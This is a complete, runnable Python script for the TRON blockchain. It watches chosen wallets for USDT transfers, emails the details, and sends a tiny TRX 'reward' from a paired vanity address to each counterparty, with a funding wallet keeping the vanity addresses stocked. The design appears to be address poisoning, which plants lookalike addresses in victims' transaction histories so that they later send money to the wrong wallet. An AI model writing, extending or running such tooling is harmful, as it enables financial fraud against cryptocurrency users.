import requests
import smtplib
import os
import time
import logging
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from decimal import Decimal
from datetime import datetime, timedelta

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")

client = Tron()

last_tx_ids = {}
last_reward_times = {}

USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
REWARD_DELAY_MINUTES = 30

SKIP_CONTRACT_ADDRESSES = [USDT_CONTRACT_ADDRESS, "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA"]
SKIP_WALLET_ADDRESSES = set(WALLET_ADDRESSES + VANITY_ADDRESSES + ["TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa"])

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
    logger.error("Missing config.")
    exit(1)

if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    logger.error("Address/key mismatch.")
    exit(1)

def wait_rate_limit():
    time.sleep(2)  # keep >1s between requests per Tronscan free API limits

def fallback_to_tronscan(address):
    try:
        logger.info(f"Querying Tronscan API for address {address}")
        url = f"https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=1&start=0&sort=-timestamp&toAddress={address}"
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            logger.warning(f"Tronscan returned status {r.status_code}")
            return None
        data = r.json().get("data", [])
        if not data:
            return None
        tx = data[0]
        if tx.get("contract_address") not in SKIP_CONTRACT_ADDRESSES:
            return None
        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from_address"),
            "to": tx.get("to_address"),
            "value": str(int(tx.get("quant", 0)))
        }
    except Exception as e:
        logger.error(f"Tronscan fallback failed: {e}")
        return None

def get_latest_trc20_transaction(wallet_address):
    tries = 0
    while tries < 3:
        try:
            tx = fallback_to_tronscan(wallet_address)
            if tx:
                return tx
            else:
                logger.info(f"No TRC20 tx found for {wallet_address} on try {tries+1}")
            tries += 1
            wait_rate_limit()
        except Exception as e:
            logger.error(f"Error fetching transactions for {wallet_address}: {e}")
            tries += 1
            wait_rate_limit()
    return None

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        logger.warning(f"Contract check failed for {address}: {e}")
        return False

def has_public_name(address):
    # Tronscan free API does not provide public name easily, skip or return False
    return False

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        logger.info("Email sent")
    except Exception as e:
        logger.error(f"Email error: {e}")

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = client.trx.freeze_balance(address, int(freeze_amount * 1_000_000), 3, "BANDWIDTH").build().sign(priv_key)
        txn.broadcast().wait()
        logger.info(f"Frozen {freeze_amount} TRX for bandwidth on {address}")
    except Exception as e:
        logger.warning(f"Freeze failed: {e}")

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            logger.info(f"Skipping send to contract address {to_address}")
            return
        now = datetime.utcnow()
        if last_reward_times.get(to_address) and now - last_reward_times[to_address] < timedelta(minutes=REWARD_DELAY_MINUTES):
            logger.info(f"Reward cooldown active for {to_address}")
            return
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        if balance < amount:
            freeze_trx_for_bandwidth(from_address, priv_key_hex)
            return
        txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("reward").build().sign(priv_key)
        result = txn.broadcast().wait()
        logger.info(f"TRX sent to {to_address}, TxID: {result.get('id')}")
        last_reward_times[to_address] = now
    except Exception as e:
        logger.error(f"TRX send error: {e}")

def get_trx_usd_price():
    try:
        wait_rate_limit()
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd", timeout=10)
        price = Decimal(r.json().get("tron", {}).get("usd"))
        logger.info(f"TRX price: ${price}")
        return price
    except Exception as e:
        logger.warning(f"Price fetch failed: {e}")
        return None

def send_trx_from_funding_wallet(to_address, amount):
    try:
        priv_key = PrivateKey(bytes.fromhex(FUNDING_PRIVATE_KEY))
        from_address = priv_key.public_key.to_base58check_address()
        balance = client.get_account_balance(from_address)
        if balance < amount:
            logger.warning("Funding wallet low.")
            return
        txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("funding").build().sign(priv_key)
        txn.broadcast().wait()
        logger.info(f"Funded {to_address} with {amount} TRX")
    except Exception as e:
        logger.error(f"Funding error: {e}")

def fund_vanity_wallet_if_low(i):
    addr = VANITY_ADDRESSES[i]
    key = VANITY_PRIVATE_KEYS[i]
    balance = client.get_account_balance(addr)
    if balance < 3:
        price = get_trx_usd_price()
        if price:
            trx_amount = (Decimal("1") / price).quantize(Decimal("0.000001"))
            send_trx_from_funding_wallet(addr, trx_amount)

logger.info("Starting monitor...")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            fund_vanity_wallet_if_low(i)
            logger.info(f"Checking: {my_address}")
            tx = get_latest_trc20_transaction(my_address)
            if tx:
                tx_id = tx["transaction_id"]
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id
                    sender = tx["from"]
                    receiver = tx["to"]
                    amount = int(tx["value"]) / 1e6
                    if amount < 1:
                        continue
                    interacting_address = sender if receiver == my_address else receiver
                    if interacting_address in SKIP_WALLET_ADDRESSES or is_contract_address(interacting_address) or has_public_name(interacting_address):
                        continue
                    logger.info(f"Sending reward to {interacting_address} for interacting with {my_address}")
                    send_email(f"Vxx {my_address}", f"USDT TX\nFrom: {sender}\nTo: {receiver}\nAmt: {amount} USDT\nTxID: {tx_id}")
                    send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
            wait_rate_limit()
    except Exception as e:
        logger.error(f"Monitoring error: {e}")
    logger.info("Sleep 30s\n")
    time.sleep(30)
